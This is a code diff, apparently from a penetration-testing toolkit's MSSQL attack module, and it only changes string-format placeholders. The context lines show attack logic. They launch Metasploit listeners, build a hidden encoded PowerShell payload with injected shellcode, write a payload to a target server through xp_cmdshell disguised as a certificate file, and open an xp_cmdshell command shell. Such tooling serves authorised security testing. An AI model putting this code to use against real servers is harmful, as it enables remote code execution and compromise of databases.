@@ -216,7 +216,7 @@ def deploy_hex2binary(ipaddr, port, username, password):
                         import pexpect
                         core.print_status("Starting the Metasploit listener...")
                         msf_path = core.meta_path()
-                        child2 = pexpect.spawn("{}-r {}\r\n\r\n".format(os.path.join(core.meta_path(), "msfconsole"),
+                        child2 = pexpect.spawn("{0}-r {1}\r\n\r\n".format(os.path.join(core.meta_path(), "msfconsole"),
                                                                         os.path.join(core.setdir, "meta_config")))
 
         # random executable name
@@ -237,7 +237,7 @@ def deploy_hex2binary(ipaddr, port, username, password):
         if not port:
             port = "443"
 
-        core.update_options("PORT={}".format(port))
+        core.update_options("PORT={0}".format(port))
         core.update_options("POWERSHELL_SOLO=ON")
         core.print_status("Prepping the payload for delivery and injecting alphanumeric shellcode...")
 
@@ -257,9 +257,9 @@ def deploy_hex2binary(ipaddr, port, username, password):
         with open(os.path.join(core.setdir, "x86.powershell")) as x86:
             x86 = x86.read()
 
-        x86 = "powershell -nop -window hidden -noni -EncodedCommand {}".format(x86)
+        x86 = "powershell -nop -window hidden -noni -EncodedCommand {0}".format(x86)
         core.print_status("If you want the powershell commands and attack, "
-                          "they are exported to {}".format(os.path.join(core.setdir, "reports/powershell")))
+                          "they are exported to {0}".format(os.path.join(core.setdir, "reports/powershell")))
         with open(os.path.join(core.setdir, "/reports/powershell/x86_powershell_injection.txt"), "w") as filewrite:
             filewrite.write(x86)
 
@@ -286,7 +286,7 @@ def deploy_hex2binary(ipaddr, port, username, password):
                 import pexpect
 
             core.print_status("Starting the Metasploit listener...")
-            child2 = pexpect.spawn("{} -r {}".format(os.path.join(msf_path, "msfconsole"),
+            child2 = pexpect.spawn("{0} -r {1}".format(os.path.join(msf_path, "msfconsole"),
                                                      os.path.join(core.setdir, "reports/powershell/powershell.rc")))
             core.print_status("Waiting for the listener to start first before we continue forward...")
             core.print_status("Be patient, Metaploit takes a little bit to start...")
@@ -308,7 +308,7 @@ def deploy_hex2binary(ipaddr, port, username, password):
         # read in the file 900 bytes at a time
         with open(os.path.join(core.setdir, 'payload.hex')) as fileopen:
             core.print_status("Dropping initial begin certificate header...")
-            conn.execute_query("exec master ..xp_cmdshell 'echo -----BEGIN CERTIFICATE----- > {}.crt'".format(random_exe))
+            conn.execute_query("exec master ..xp_cmdshell 'echo -----BEGIN CERTIFICATE----- > {0}.crt'".format(random_exe))
             for data in fileopen.read(900).rstrip():
                 if not data:
                     continue
@@ -356,7 +356,7 @@ def deploy_hex2binary(ipaddr, port, username, password):
     # we append more commands if option 1 is used
     if option == "1":
         core.print_status("Triggering the powershell injection payload... ")
-        sql_command = ("exec master..xp_cmdshell '{}'".format(powershell_command))
+        sql_command = ("exec master..xp_cmdshell '{0}'".format(powershell_command))
         thread.start_new_thread(conn.execute_query, (sql_command,))
 
     # using the old method
@@ -415,7 +415,7 @@ def cmdshell(ipaddr, port, username, password, option):
         # if the command isnt empty
         elif cmd:
             # execute the command
-            mssql.sql_query("exec master..xp_cmdshell '{}'".format(cmd))
+            mssql.sql_query("exec master..xp_cmdshell '{0}'".format(cmd))
             # print the rest of the data
             mssql.printReplies()
             mssql.colMeta[0]['TypeData'] = 80 * 2
